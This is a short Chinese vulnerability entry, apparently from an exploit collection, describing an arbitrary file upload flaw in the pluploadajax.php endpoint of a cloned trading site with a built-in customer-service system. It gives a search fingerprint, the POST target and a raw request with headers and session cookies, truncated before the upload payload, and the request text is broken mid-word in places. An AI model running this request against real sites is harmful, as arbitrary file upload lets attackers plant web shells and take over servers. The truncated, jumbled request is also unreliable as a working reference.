# 仿转转交易猫⼗六合⼀⾃带客服系统pluploadajax存在任意文件上传漏洞

- **系统**：仿转转交易猫⼗六合⼀⾃带客服系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`header="Location: [http://www.baidu.com"`
- **请求**：`POST /wuyun/pluploadajax.php HTTP/1.1`

**请求体 / payload**
```
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 198
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylEvfENhB
9EVsJApl
Cookie: Aname=wuyun; deviceid=1708223329907; rockkefu_deviceid=17082404095
82; BJYADMIN=7ovdcsf3httsj0r6fbu10mk7l2; adminToken=a66abb5684c45962d88756
4f08346e8d; userName=test; userToken=05a671c66aefea124cc08b76ea6d30bb; use
rname=mstir; passid=l5no2rmjhs4g824ry6wymx104j5dy5y24w4utq0w25mfzh34comxj8
gpg02xnr5t; bbs_token=Z8NDY3CV5JTOuj7RkvnIbyzQZsstjYWW8KV1SA_3D_3D; PHPSES
SID=bbd30367d9c0c0261b13b63f00ee3a3f; mysid=85817cf…（脚本共 1298 字，完整版见原文）
```
- **预期**：200　|　—